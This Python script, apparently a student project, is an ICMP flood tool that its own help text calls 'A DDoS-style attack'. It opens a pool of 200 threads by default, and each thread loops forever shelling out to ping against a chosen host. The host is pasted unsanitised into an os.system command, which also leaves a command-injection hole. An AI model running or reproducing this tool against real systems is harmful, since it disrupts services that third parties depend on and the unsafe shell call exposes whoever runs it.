# Author: Nathan Bloom (nxb4951@rit.edu)
# TODO list: add support for remote control

import argparse
import concurrent.futures
import sys
import os


def thread_func(h):
    while True:  # send the header over and over again s seconds apart until enough time has passed
        os.system("ping -c 100000 " + h)


def main():
    # parsing setup
    parser = argparse.ArgumentParser(description="A DDoS-style attack using ICMP")
    parser.add_argument("host", nargs="?", help="The host to attack")
    parser.add_argument("-c", "--count", default=200, type=int,
                        help="The number of connections to create (defaults to 200)")
    args = parser.parse_args()

    if len(sys.argv) <= 1:  # if running with no arguments, print help and exit
        parser.print_help()
        exit()

    if not args.host:  # if running with no host, print help, an error message, and exit
        parser.print_help()
        print("You must specify a host!")
        exit()

    print(f"Attacking {args.host} with {args.count} workers")
    # thread_func([args.host, args.port, args.sleep, args.time])
    with concurrent.futures.ThreadPoolExecutor(max_workers=args.count) as executor:  # start the threads
        executor.map(thread_func, [args.host] * args.count)


if __name__ == "__main__":
    main()
